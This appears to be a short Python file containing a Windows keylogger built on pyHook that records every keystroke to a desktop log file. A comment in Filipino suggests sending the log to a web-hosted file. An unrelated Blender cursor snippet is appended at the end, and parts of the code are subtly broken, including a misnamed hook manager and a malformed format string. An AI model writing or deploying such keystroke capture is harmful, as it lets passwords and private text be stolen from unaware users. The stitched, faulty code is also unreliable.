'''
Written By Ronel B. Llarenas
Github.com/llarenas
'''

import pyHook,pythoncom, sys, logging

file_log = 'C:\Documents and Settings\p\Desktop\log.txt' # pwede i address ni sa account mo sa web nga txt para ma send online sa im ang log.

def OnKeyboardEvent (event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='#(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

hooks_manager = PyHook.hookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


###cursor.py.module
def show():
	import bge
	bge.render.showMouse(True)
def hide():
	import bge
	bge.render.showMouse(False)

